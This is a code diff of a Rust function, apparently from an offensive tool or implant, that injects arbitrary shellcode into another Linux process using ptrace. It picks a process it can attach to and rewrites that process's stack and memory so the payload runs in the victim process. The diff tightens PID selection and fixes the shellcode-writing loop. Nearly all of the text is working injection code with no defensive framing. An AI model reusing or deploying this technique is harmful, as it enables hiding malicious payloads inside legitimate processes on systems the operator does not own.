@@ -18,14 +18,13 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
                                                         .split('\n')
                                                         .flat_map(|s| s.parse().ok())
                                                         .collect();
-    pids.retain(|i| *i != 1);
-    pids.retain(|i| *i != process::id() as i32);
-    for pid in pids.iter() {
-        let attach_result = attach(Pid::from_raw(*pid));
-        if attach_result.is_ok() {
+    pids.retain(|i| *i > 1000 && *i != process::id() as i32);
+    //pids.sort();
+    for pid in pids.iter().rev() {
+        if let Ok(_) = attach(Pid::from_raw(*pid)) {
             target_pid = *pid;
             break;
-        }
+        };
     }
     if target_pid == 0 {
         panic!("Could not find a process whose memory can be manipulated");
@@ -42,7 +41,6 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
     println!("{:?}", registers);
     registers.rsp -= 4;
     println!("{:?}", registers);
-    //let blah = AddressType::new(registers.rsp);
     if let Err(error) = unsafe { write(target_pid, registers.rsp as *mut c_void, registers.rip as *mut c_void) }{
         panic!("Unable to write RIP to RSP in target process: {}", error);
     }
@@ -53,8 +51,9 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
     }
     let mut index = 0;
     while index < shellcode.len() {
-        let slice = &shellcode[index..cmp::max(index, shellcode.len())];
-        if let Err(error) = unsafe { write(target_pid, point as *mut c_void, slice.as_ptr() as *mut c_void) }{
+        let slice = &shellcode[index..];
+        //println!("{:?}", slice);
+        if let Err(error) = unsafe { write(target_pid, point as *mut c_void, slice.as_ptr() as *mut c_void) } {
             panic!("Unable to portion of shellcode at {} to target process: {}", index, error);
         }
         index += 4;
@@ -64,5 +63,5 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
     if let Err(error) = detach(target_pid, None) {
         panic!("Unable to detach from target process: {}", error);
     }
-    // Try http://phrack.org/issues/59/12.html but with https://man7.org/linux/man-pages/man2/process_vm_readv.2.html
+    println!("DONE?");
 }
